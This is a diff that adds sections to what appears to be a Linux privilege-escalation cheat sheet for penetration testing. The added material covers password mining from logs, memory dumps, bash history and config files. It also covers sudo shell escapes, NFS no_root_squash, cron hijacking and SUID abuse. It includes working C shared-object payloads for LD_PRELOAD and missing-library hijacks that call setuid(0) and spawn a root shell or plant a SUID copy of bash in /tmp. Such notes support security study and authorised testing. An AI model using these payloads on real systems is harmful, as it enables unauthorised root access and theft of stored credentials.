@@ -100,64 +100,206 @@ unix-privesc-check {standard | detailed}
 
 ---
 
+## Vulnerable Software Running as Different User
+Check what software is installed and whether they have vulnerabilities
+```shell
+dpkg -l
+yum list installed
+rpm -qa
+```
+
+---
+
 ## Password Mining
 ### Logs
+Check if passwords are incorrectly stored in logs (may have weak file permissions)
+```shell
+grep -RiIn passw /var/log/
+```
 
 ---
 
 ### Memory
+If application runs in the same user context, you have access to its memory and can either dump memory or directly search it to find plaintext passwords
+
+GDB
+```shell
+gdb -p <pid>
+info proc mappings
+dump memory <out file> <start mem region> <stop mem region>
+```
+
+gcore
+```shell
+gcore -o <out file> <pid>
+```
 
 ---
 
 ### History
+Check for user command history, e.g. Bash
+```shell
+cat ~/.bash_history
+```
 
 ---
 
 ### Configuration Files
+General Search
+```shell
+grep -RiIn passw / 2>/dev/null
+```
+
+Common examples
+- OpenVPN
+    - Allows storing of credentials for automated authentication processes
+- Irssi
+    - Allows storing of credentials for IRC service automation
 
 ---
 
 ## Sudo
-### Shell Escape Sequences
+### Shell Escape Sequences/Abuse Functionality
+Check what the user can run using sudo
+```shell
+sudo -l
+cat /etc/sudoers
+```
+
+Some programs have shell escape sequences
+- Check [GTFOBins](https://gtfobins.github.io/)
+- Google around as GTFOBins doesn't capture everything, e.g.
+    - Apache2 can be used to read files (unintended - will give error that includes file contents)
+    ```shell
+    sudo apache2 -f <file>
+    ```
 
 ---
 
-### Abuse Intended Functionality
+### LD_LIBRARY_PATH/LD_PRELOAD
+- Environment variables
+- `LD_LIBRARY_PATH` list of directories from which ELF binaries are searched at execution-time
+- `LD_PRELOAD` user-specified list of additional ELF shared objects to be loaded before all others
+- Not respected in secure-execution mode, which is activated if:
+    - The processes real (uid) and effective user IDs (euid) differ, or the real (gid) and effective group IDs (egid) differ
+    - A process with a non-root uid executed a binary that granted permitted or effective capabilities (effective capabilities are what a process can do and permitted capabilities are the capabilities a process is allowed to have, if it requests them with the appropriate call)
+    - A Linux Security Module (LSM) has enabled the mode
 
----
+Check if sudo has the ability to preserve environment variables
+```shell
+sudo -l
+```
+- Check for `env_keep+=LD_LIBRARY_PATH` or `env_keep+=LD_PRELOAD`
 
-### LD_PRELOAD/LD_LIBRARY_PATH
+Exploit by compiling a Shared Object (.so) file e.g.
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");  # or LD_LIBRARY_PATH as needed
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+- Set `LD_PRELOAD` or `LD_LIBRARY_PATH` (whichever is used) to point to the .so file and run the program
+- i.e. `sudo LD_PRELOAD=<so file path> <program>`
 
 ---
 
 ## NFS
+Check if root squashing is disabled `no_root_squash`
+```shell
+cat /etc/exports   # Locally
+showmount -e <ip>  # Remotely
+```
+
+Exploit by mounting NFS share, placing an executable on the share as root, setting suid permissions and running the file on the NFS server
+- [nfsshell](https://github.com/NetDirect/nfsshell)
 
 ---
 
 ## Cron
+- User-level at /var/spool/cron/crontabs/
+- System-level at /etc/crontab
+
 ### Path
+If the $PATH env var (seen within the crontab schedule file) can be redefined, you can compile a payload and place it in the identified path and wait for crontab to run the file
 
 ---
 
 ### Wildcards
+Bash supports [globbing](http://tldp.org/LDP/abs/html/globbingref.html) (filename expansion), with alphabetical order results:
+    - `*` wild card 0-n chars
+    - `?` wild card 1 char
+    - `[]` character lists
+    - `^` match negation
+    - `{}` list of matching patterns
+
+If cron job uses globbing, can place a file which will take precendent over the intended file
 
 ---
 
 ### File Overwrite
+If files executed as part of cron job are modifiable, they can be replaced with a payload
+```shell
+ls -l <file>
+```
 
 ---
 
 ## File Permissions
-### SUID Binaries
+### SUID/SGID Binaries
+- Files with permission of `4XXX` (SUID)
+- Files with permission of `2XXX` (SGID)
+
 #### Shared Object Notation
+- Shared object `.so` files are the Linux equivalent of Windows `.dll` files which contain reusable routines, exposed via an exports table as functions (symbols)
+- Loaded within the context of an existing process
+- Either statically or dynamically linked
+
+Check for missing Shared Objects
+```shell
+strace <executable file> 2>&1 | grep -iE "open|access|no such file"
+```
+- Check if you can write to the location where the missing file should be
+
+Compile .so file and place it in the necessary location, e.g.
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
 
 ---
 
 #### Symlink
+Check whether there is a reference to another file or symbolic link and whether it exists and place the payload there if you have write access
+```shell
+ls -l <path>
+```
 
 ---
 
 #### Evnironment Variables
+- Executable running as root may use the $PATH variable via `system()`, `popen()`, `execlp()`, `execvp()`, `execvpe()`, etc.
+- Can check using
+    - Decompilation/disassembly
+    - Strings
+
+```shell
+find / -type f -perm -04000 -ls 2>/dev/null  # All SUID files
+find / -type f -perm -02000 -ls 2>/dev/null  # All SGID files
+```
+
+Exploit by placing the payload in a location in $PATH which precedes all other defined paths
 
 ---
 
@@ -362,6 +504,7 @@ tcpdump tcp dst <ip> <port>
 ---
 
 ## References
+- <https://github.com/sagishahar/lpeworkshop>
 - <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
 - <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic>
 - <https://blog.pentests.pl>
